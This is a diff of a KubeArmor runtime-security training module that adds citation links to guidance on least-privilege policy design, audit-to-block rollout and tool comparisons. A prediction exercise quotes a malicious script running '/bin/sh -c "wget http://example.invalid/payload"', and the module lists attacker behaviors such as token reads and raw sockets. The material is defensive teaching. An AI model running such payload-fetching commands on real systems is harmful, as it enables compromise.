@@ -1,4 +1,5 @@
 ---
+citations_verified: true
 title: "Module 4.6: KubeArmor - Runtime Security with Least Privilege"
 slug: platform/toolkits/security-quality/security-tools/module-4.6-kubearmor
 sidebar:
@@ -31,7 +32,7 @@ After completing this module, you will be able to:
 
 A platform team inherits a production cluster where every container image has passed vulnerability scanning, every Deployment has resource limits, and every namespace has a NetworkPolicy. Then one supplier publishes a compromised image under a trusted tag. The container starts successfully because the image is valid, the Pod is admitted because the manifest is compliant, and the application still answers health checks while an unexpected binary runs beside it. Nothing in the deployment pipeline asked the most important runtime question: what is this container actually allowed to do after it starts?
 
-KubeArmor matters because many security controls stop at the edge of the workload. Admission control can reject risky Pod specs before scheduling, image scanners can detect known vulnerable packages, and NetworkPolicies can restrict pod-to-pod traffic. Those controls are valuable, but they do not directly say that an `nginx` container may execute `nginx` and read its configuration, while it may not start `/bin/sh`, read service account tokens, write miner configuration under `/var/tmp`, or create raw sockets. KubeArmor moves that decision into the running node, where process, file, network, and capability activity actually happens.
+KubeArmor matters because many security controls stop at the edge of the workload. Admission control can reject risky Pod specs before scheduling, image scanners can detect known vulnerable packages, and NetworkPolicies can restrict pod-to-pod traffic. Those controls are valuable, but they do not directly say that an `nginx` container may execute `nginx` and read its configuration, while it may not start `/bin/sh`, read service account tokens, write miner configuration under `/var/tmp`, or create raw sockets. KubeArmor moves that decision into the running node, where [process, file, network, and capability activity](https://raw.githubusercontent.com/kubearmor/KubeArmor/main/README.md) actually happens.
 
 The practical lesson is not that KubeArmor replaces the rest of your security stack. It gives the platform team a least-privilege enforcement layer that complements detection tools and deployment-time policy. A senior platform engineer uses it carefully: first to observe real behavior, then to narrow permissions in staging, then to enforce high-confidence controls in production, and finally to feed alerts into the same incident workflow as Falco, Tetragon, audit logs, and SIEM events.
 
@@ -88,7 +89,7 @@ A useful mental model is that image scanning asks what is inside the image, [adm
 
 **Pause and predict:** imagine a compromised web image where the legitimate server process is `/usr/sbin/nginx`, but a malicious post-start script attempts to run `/bin/sh -c "wget http://example.invalid/payload"`. If the KubeArmor policy allows only `/usr/sbin/nginx` and blocks recursive execution from `/`, which part of the attack fails first, and what evidence would you expect in the KubeArmor logs?
 
-A beginner often wants to write one large policy immediately, but a senior engineer starts by identifying the behavior classes. Process controls answer "Which binaries may execute?" File controls answer "Which files and directories may be read or written?" [Network protocol controls answer "Which protocol families are acceptable from this workload?"](https://raw.githubusercontent.com/kubearmor/KubeArmor/main/getting-started/security_policy_specification.md) Capability controls answer "Which privileged kernel operations should remain available?" The exact policy syntax matters, but the design skill is in mapping application behavior to those categories without overfitting one lucky test run.
+A beginner often wants to write one large policy immediately, but a senior engineer starts by identifying the behavior classes. [Process controls answer "Which binaries may execute?"](https://raw.githubusercontent.com/kubearmor/KubeArmor/main/getting-started/security_policy_specification.md) File controls answer "Which files and directories may be read or written?" [Network protocol controls answer "Which protocol families are acceptable from this workload?"](https://raw.githubusercontent.com/kubearmor/KubeArmor/main/getting-started/security_policy_specification.md) Capability controls answer "Which [privileged kernel operations](https://kubernetes.io/docs/concepts/security/linux-kernel-security-constraints/) should remain available?" The exact policy syntax matters, but the design skill is in mapping application behavior to those categories without overfitting one lucky test run.
 
 | Runtime question | KubeArmor policy area | Example decision | Operational risk if ignored |
 |---|---|---|---|
@@ -102,7 +103,7 @@ The security model also has a cost. A poorly designed allow-list can break legit
 
 ### 2. KubeArmor Architecture and Enforcement Boundaries
 
-KubeArmor is Kubernetes-native from the operator's point of view, but the enforcement work happens on each node. The cluster stores policy objects as CRDs, and a node-level agent observes workload metadata, resolves which policies apply to which containers, and programs enforcement through the available Linux security backend. This separation is important because a policy that looks correct in the API is not useful unless the target node supports an enforcer capable of applying it.
+KubeArmor is Kubernetes-native from the operator's point of view, but the enforcement work happens on each node. The cluster stores [policy objects as CRDs](https://raw.githubusercontent.com/kubearmor/KubeArmor/main/README.md), and a node-level agent observes workload metadata, resolves which policies apply to which containers, and programs enforcement through the available Linux security backend. This separation is important because a policy that looks correct in the API is not useful unless the target node supports an enforcer capable of applying it.
 
 ```text
 +--------------------------------------------------------------------------------+
@@ -147,7 +148,7 @@ The architecture has three boundaries learners should keep separate. First, Kube
 | `KubeArmorClusterPolicy` | Cluster-scoped workload policy | Selector is narrow enough to avoid accidental global impact |
 | `KubeArmorHostPolicy` | Node or host protection policy | Host targeting is deliberate and tested separately from Pod policy |
 
-KubeArmor can use [different enforcement backends depending on the node operating system and kernel support](https://github.com/kubearmor/KubeArmor/blob/main/getting-started/FAQ.md). Platform engineers should treat this as a compatibility requirement, not a trivia item. A policy design that works in a homogeneous Ubuntu node pool may behave differently when workloads move to a RHEL-based node pool, a managed Kubernetes runtime with different kernel configuration, or a pool where BPF-LSM support is absent.
+KubeArmor can use [different enforcement backends depending on the node operating system and kernel support](https://github.com/kubearmor/KubeArmor/blob/main/getting-started/FAQ.md). Platform engineers should treat this as a compatibility requirement, not a trivia item. A policy design that works in a homogeneous Ubuntu node pool may behave differently when workloads move to a RHEL-based node pool, [a managed Kubernetes runtime with different kernel configuration](https://raw.githubusercontent.com/kubearmor/KubeArmor/main/getting-started/support_matrix.md), or a pool where BPF-LSM support is absent.
 
 | Backend | Typical environment | Strength | Design caution |
 |---|---|---|---|
@@ -158,7 +159,7 @@ KubeArmor can use [different enforcement backends depending on the node operatin
 
 **Stop and think:** your staging cluster uses Ubuntu nodes and reports AppArmor enforcement, while production includes a newer managed node pool where the provider image may expose a different enforcer. Before you approve production rollout, what command output would you collect, and why is "the YAML applied successfully" not enough evidence?
 
-[The `karmor probe` command is a quick way to verify whether KubeArmor is running and which enforcer is active](https://github.com/kubearmor/KubeArmor/blob/main/getting-started/FAQ.md). The exact output varies by version and environment, so the important habit is to look for three facts: KubeArmor components are reachable, each expected node is represented, and an enforcer is active where you expect blocking behavior. A policy can exist in Kubernetes while still failing to enforce if the node layer is not ready.
+[The `karmor probe` command is a quick way to verify whether KubeArmor is running and which enforcer is active](https://github.com/kubearmor/KubeArmor/blob/main/getting-started/FAQ.md). The exact output varies by version and environment, so the important habit is to look for three facts: KubeArmor components are reachable, each expected node is represented, and [an enforcer is active where you expect blocking behavior](https://raw.githubusercontent.com/kubearmor/KubeArmor/main/getting-started/FAQ.md). A policy can exist in Kubernetes while still failing to enforce if the node layer is not ready.
 
 ```bash
 kubectl get pods -n kubearmor
@@ -178,7 +179,7 @@ When a team says "KubeArmor is not working," the failure usually sits in one of 
 
 ### 3. Designing KubeArmorPolicy From Behavior, Not Syntax
 
-A KubeArmor policy starts with a selector because runtime security is workload-specific. A policy for `nginx` should not accidentally constrain a migration job, and a cluster-wide baseline should not silently apply to system controllers unless that is the intended design. [Labels therefore become part of the security contract.](https://raw.githubusercontent.com/kubearmor/KubeArmor/main/getting-started/security_policy_specification.md) If the platform standard allows ambiguous labels, KubeArmor policies become easier to misapply.
+[A KubeArmor policy starts with a selector](https://raw.githubusercontent.com/kubearmor/KubeArmor/main/getting-started/security_policy_specification.md) because runtime security is workload-specific. A policy for `nginx` should not accidentally constrain a migration job, and a cluster-wide baseline should not silently apply to system controllers unless that is the intended design. [Labels therefore become part of the security contract.](https://raw.githubusercontent.com/kubearmor/KubeArmor/main/getting-started/security_policy_specification.md) If the platform standard allows ambiguous labels, KubeArmor policies become easier to misapply.
 
 The smallest useful policy has three parts: metadata that scopes the policy, [a selector that finds the workload, and rules that describe process, file, network, or capability behavior](https://raw.githubusercontent.com/kubearmor/KubeArmor/main/getting-started/security_policy_specification.md). The example below is intentionally modest. It does not try to solve every security problem at once; it blocks interactive shell execution for a specific application label so the team can verify that policy selection and event logging work before moving to stricter least privilege.
 
@@ -214,7 +215,7 @@ This is not a complete allow-list. It is a targeted block policy that proves the
 | Cluster baseline | Organization-wide minimum standard | Block dangerous capabilities in app namespaces | Broad selectors can hit workloads with special needs |
 | Host policy | Node protection beyond containers | Protect host paths or node processes | Blast radius is higher and rollback must be rehearsed |
 
-A worked example makes the design process concrete. Suppose a platform team runs an `nginx:alpine` Deployment that only serves static content. The desired behavior is narrow: start `nginx`, read configuration and web content, write runtime files under expected cache and log directories, perform TCP connections for normal service behavior, and use UDP only where DNS is required. The undesired behavior includes starting shells, fetching remote payloads with helper tools, reading service account tokens, modifying `/etc/nginx`, and using raw sockets.
+A worked example makes the design process concrete. Suppose a platform team runs an `nginx:alpine` Deployment that only serves static content. The desired behavior is narrow: start `nginx`, read configuration and web content, write runtime files under expected cache and log directories, perform TCP connections for normal service behavior, and use UDP only where DNS is required. The undesired behavior includes starting shells, fetching remote payloads with helper tools, reading [service account tokens](https://kubernetes.io/docs/reference/access-authn-authz/service-accounts-admin/), modifying `/etc/nginx`, and using raw sockets.
 
 The team should first translate that story into behavior categories before writing YAML. Process rules should allow the `nginx` binary and block recursive execution where the container should not run arbitrary tools. File rules should make configuration and content read-only while preserving writable paths needed by the server. Network rules should permit ordinary protocols but block raw socket behavior. The policy below demonstrates the pattern, but a real team would still validate it in staging because images and entrypoints vary.
 
@@ -307,7 +308,7 @@ k get deploy -n production --show-labels
 karmor logs --namespace production
 ```
 
-The next stage is audit. Audit policies are useful because they test selectors and rule intent while allowing the operation to proceed. If an audit rule unexpectedly fires during normal traffic, the team has found a modeling gap without causing an outage. If an audit rule never fires when a test should trigger it, the team has found a selector, path, backend, or test-design problem before relying on enforcement.
+The next stage is audit. [Audit policies are useful because they test selectors and rule intent while allowing the operation to proceed.](https://raw.githubusercontent.com/kubearmor/KubeArmor/main/getting-started/FAQ.md) If an audit rule unexpectedly fires during normal traffic, the team has found a modeling gap without causing an outage. If an audit rule never fires when a test should trigger it, the team has found a selector, path, backend, or test-design problem before relying on enforcement.
 
 ```yaml
 apiVersion: security.kubearmor.com/v1
@@ -338,7 +339,7 @@ spec:
         action: Audit
 ```
 
-After audit, move selected controls to blocking. The safest early blocks are behaviors that production applications should rarely need: raw sockets in ordinary web workloads, interactive shell execution in immutable server containers, access to service account tokens for workloads that do not call the Kubernetes API, and unnecessary Linux capabilities. The more application-specific the rule, the more evidence you need before enforcing it.
+After audit, move selected controls to blocking. The safest early blocks are behaviors that production applications should rarely need: [raw sockets in ordinary web workloads](https://raw.githubusercontent.com/kubearmor/KubeArmor/main/getting-started/security_policy_examples.md), interactive shell execution in immutable server containers, access to service account tokens for workloads that do not call the Kubernetes API, and unnecessary Linux capabilities. The more application-specific the rule, the more evidence you need before enforcing it.
 
 ```text
 +--------------------------------------------------------------------------------+
@@ -375,7 +376,7 @@ A rollback plan is part of the policy, even if Kubernetes does not store it in t
 | Enforce | `k apply -f block-policy.yaml` | Blocked tests fail and app health remains good | Health checks, traffic, and logs are clean |
 | Operate | SIEM or alert pipeline | Events are triaged with ownership | Policy drift is reviewed during releases |
 
-KubeArmor events are only useful if operators can interpret them. A policy event should answer what happened, which policy matched, which workload was involved, and what action was taken. If the event stream is too noisy, the team will ignore it. If it is too sparse, the team will not trust it. Good policy design includes event design: meaningful policy names, namespace scoping, labels that identify service ownership, and runbooks that connect common alerts to next actions.
+KubeArmor events are only useful if operators can interpret them. [A policy event should answer what happened, which policy matched, which workload was involved, and what action was taken.](https://raw.githubusercontent.com/kubearmor/KubeArmor/main/getting-started/FAQ.md) If the event stream is too noisy, the team will ignore it. If it is too sparse, the team will not trust it. Good policy design includes event design: meaningful policy names, namespace scoping, labels that identify service ownership, and runbooks that connect common alerts to next actions.
 
 ```bash
 karmor logs --namespace production --logFilter=policy
@@ -388,7 +389,7 @@ The correct answer depends on ownership and risk. If the shell-based probe is ac
 
 ### 5. Choosing KubeArmor Alongside Falco, Tetragon, and Kubernetes Controls
 
-KubeArmor sits in a crowded security toolkit, and confusion between tools leads to weak architectures. Falco is primarily used for runtime detection and alerting. Tetragon uses eBPF-based visibility and enforcement patterns, especially attractive in Cilium-heavy environments. [Kubernetes NetworkPolicies constrain traffic between Pods and network endpoints](https://kubernetes.io/docs/concepts/services-networking/network-policies/). Admission controllers prevent noncompliant resources from entering the cluster. KubeArmor focuses on workload and host runtime enforcement through Linux security hooks.
+KubeArmor sits in a crowded security toolkit, and confusion between tools leads to weak architectures. [Falco is primarily used for runtime detection and alerting](https://raw.githubusercontent.com/falcosecurity/falco/master/README.md). Tetragon uses [eBPF-based visibility and enforcement patterns](https://raw.githubusercontent.com/cilium/tetragon/main/README.md), especially attractive in Cilium-heavy environments. [Kubernetes NetworkPolicies constrain traffic between Pods and network endpoints](https://kubernetes.io/docs/concepts/services-networking/network-policies/). Admission controllers prevent noncompliant resources from entering the cluster. KubeArmor focuses on workload and host runtime enforcement through Linux security hooks.
 
 | Feature | KubeArmor | Tetragon | Falco | Kubernetes NetworkPolicy | Admission policy |
 |---|---|---|---|---|---|
@@ -427,7 +428,7 @@ A helpful design pattern is "prevent what you understand, detect what you cannot
 +--------------------------------------------------------------------------------+
 ```
 
-There are also cases where KubeArmor is not the first tool to reach for. If the immediate problem is that Pods are being deployed as privileged with hostPath mounts, admission control should stop that earlier. If the problem is east-west service access, NetworkPolicy or CNI policy is the direct control. If the problem is broad threat hunting across kernel events, a detection-oriented tool may provide richer context. KubeArmor shines when the team needs to narrow what a workload or host may do after it is already running.
+There are also cases where KubeArmor is not the first tool to reach for. If the immediate problem is that Pods are being deployed as privileged with hostPath mounts, [admission control should stop that earlier](https://kubernetes.io/docs/reference/access-authn-authz/admission-controllers/). If the problem is east-west service access, [NetworkPolicy or CNI policy is the direct control](https://kubernetes.io/docs/concepts/services-networking/network-policies/). If the problem is broad threat hunting across kernel events, a detection-oriented tool may provide richer context. KubeArmor shines when the team needs to narrow what a workload or host may do after it is already running.
 
 A senior rollout also accounts for organizational ownership. Application teams know normal behavior, platform teams know cluster enforcement, and security teams know risk appetite and detection workflows. KubeArmor policies work best when those groups share a review process. The platform team can provide templates and guardrails, application owners can validate behavior, and security can decide which behaviors become mandatory baselines across namespaces.
 
@@ -587,7 +588,7 @@ The incident also demonstrates a subtle platform lesson. A perfectly strict poli
 
 ## Did You Know?
 
-- KubeArmor can protect both Kubernetes workloads and host resources, but host policy has a larger blast radius and should be rolled out with stricter change control than namespaced workload policy.
+- KubeArmor can protect both [Kubernetes workloads and host resources](https://raw.githubusercontent.com/kubearmor/KubeArmor/main/getting-started/support_matrix.md), but host policy has a larger blast radius and should be rolled out with stricter change control than namespaced workload policy.
 - KubeArmor policy quality depends heavily on Kubernetes labels because selectors decide which workloads receive enforcement; weak label hygiene becomes a security problem.
 - Audit mode is valuable even for teams that plan to block aggressively because it tests policy matching, event routing, and workload assumptions without immediately disrupting traffic.
 - Runtime least privilege improves incident response because blocked events describe attempted behavior, giving responders concrete evidence instead of only a generic "container compromised" signal.
@@ -950,3 +951,9 @@ You've completed the security tools toolkit. Continue to [Platform Engineering D
 - [github.com: FAQ.md](https://github.com/kubearmor/KubeArmor/blob/main/getting-started/FAQ.md) — The upstream FAQ directly says to use `karmor probe` for support checks and explains the meaning of a blank `Active LSM`.
 - [kubernetes.io: service accounts admin](https://kubernetes.io/docs/reference/access-authn-authz/service-accounts-admin/) — The Kubernetes ServiceAccount admin reference directly documents the projected token volume and mount path.
 - [kubernetes.io: network policies](https://kubernetes.io/docs/concepts/services-networking/network-policies/) — The Kubernetes NetworkPolicy concept page directly defines its L3/L4 scope and selector model.
+- [raw.githubusercontent.com: support matrix.md](https://raw.githubusercontent.com/kubearmor/KubeArmor/main/getting-started/support_matrix.md) — The KubeArmor support matrix maps platforms and OS images to observability, blocking support, and LSM enforcers.
+- [raw.githubusercontent.com: FAQ.md](https://raw.githubusercontent.com/kubearmor/KubeArmor/main/getting-started/FAQ.md) — The FAQ explicitly tells users to use karmor probe for support checks and explains the blank Active LSM condition.
+- [raw.githubusercontent.com: security policy examples.md](https://raw.githubusercontent.com/kubearmor/KubeArmor/main/getting-started/security_policy_examples.md) — The upstream examples include a raw-socket block policy using `capabilities.matchCapabilities` with `net_raw`.
+- [raw.githubusercontent.com: README.md](https://raw.githubusercontent.com/falcosecurity/falco/master/README.md) — The Falco README directly describes Falco as a runtime security tool designed to detect and alert on abnormal behavior.
+- [raw.githubusercontent.com: README.md](https://raw.githubusercontent.com/cilium/tetragon/main/README.md) — The Tetragon README directly states that it provides eBPF-based security observability, runtime enforcement, and Kubernetes-aware events.
+- [kubernetes.io: linux kernel security constraints](https://kubernetes.io/docs/concepts/security/linux-kernel-security-constraints/) — The Kubernetes Linux kernel security constraints page explains capabilities, seccomp, AppArmor, SELinux, and the privileged-container implications of CAP_SYS_ADMIN and CAP_NET_ADMIN.
